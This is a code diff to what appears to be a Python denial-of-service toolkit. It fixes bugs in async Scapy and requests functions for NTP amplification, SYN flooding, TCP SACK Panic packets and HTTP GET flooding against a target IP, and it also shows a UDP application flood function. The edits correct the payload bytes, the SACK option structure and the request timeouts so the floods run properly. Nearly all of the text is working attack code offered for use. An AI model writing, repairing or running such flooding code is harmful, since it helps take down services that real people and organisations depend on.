@@ -35,11 +35,14 @@ async def ntp_amplification(target_ip, duration):
     logging.info("[NTP Amplification] Attack started.")
     end_time = time.time() + duration
     while time.time() < end_time:
-        packet = IP(dst=target_ip, src="pool.ntp.org")/UDP(dport=123)/Raw(load="\x17\x00\x03\x2a" + b"\x00" * 4)
+        # Convert payload to bytes
+        payload = b"\x17\x00\x03\x2a" + b"\x00" * 4
+        packet = IP(dst=target_ip)/UDP(dport=123)/Raw(load=payload)
         send(packet, verbose=False)
         logging.info("[NTP Amplification] Amplified packet sent to %s", target_ip)
         await asyncio.sleep(0.01)  # Prevent blocking
     logging.info("[NTP Amplification] Attack finished.")
+
 
 # SYN Flood
 async def syn_flood(target_ip, target_port, duration):
@@ -55,7 +58,8 @@ async def syn_flood(target_ip, target_port, duration):
 # TCP SACK Panic Attack
 async def tcp_sack_panic(target_ip, target_port, duration):
     logging.info("[TCP SACK Panic] Attack started.")
-    sack_option = TCPOptions([('SACK', [b"\x00" * 8] * 4)])
+    # TCP options for SACK
+    sack_option = [('SACK', b"\x00" * 8)]  # Fix the tuple structure
     end_time = time.time() + duration
     while time.time() < end_time:
         packet = IP(dst=target_ip)/TCP(dport=target_port, options=sack_option)
@@ -64,6 +68,8 @@ async def tcp_sack_panic(target_ip, target_port, duration):
         await asyncio.sleep(0.01)  # Prevent blocking
     logging.info("[TCP SACK Panic] Attack finished.")
 
+
+
 # HTTP GET/POST Flood
 async def http_flood(http_target, duration):
     logging.info("[HTTP Flood] Attack started.")
@@ -71,12 +77,13 @@ async def http_flood(http_target, duration):
     end_time = time.time() + duration
     while time.time() < end_time:
         try:
-            requests.get(http_target, headers=headers)
+            requests.get(http_target, headers=headers, timeout=5)  # Tambahkan timeout
             logging.info("[HTTP Flood] GET request sent to %s", http_target)
-        except requests.exceptions.RequestException:
-            logging.warning("[HTTP Flood] Failed to send GET request to %s", http_target)
+        except requests.exceptions.RequestException as e:
+            logging.warning("[HTTP Flood] Failed to send GET request to %s: %s", http_target, e)
         await asyncio.sleep(0.01)  # Prevent blocking
     logging.info("[HTTP Flood] Attack finished.")
+
 
 # UDP Application Layer Flood
 async def udp_app_flood(target_ip, target_port, duration):
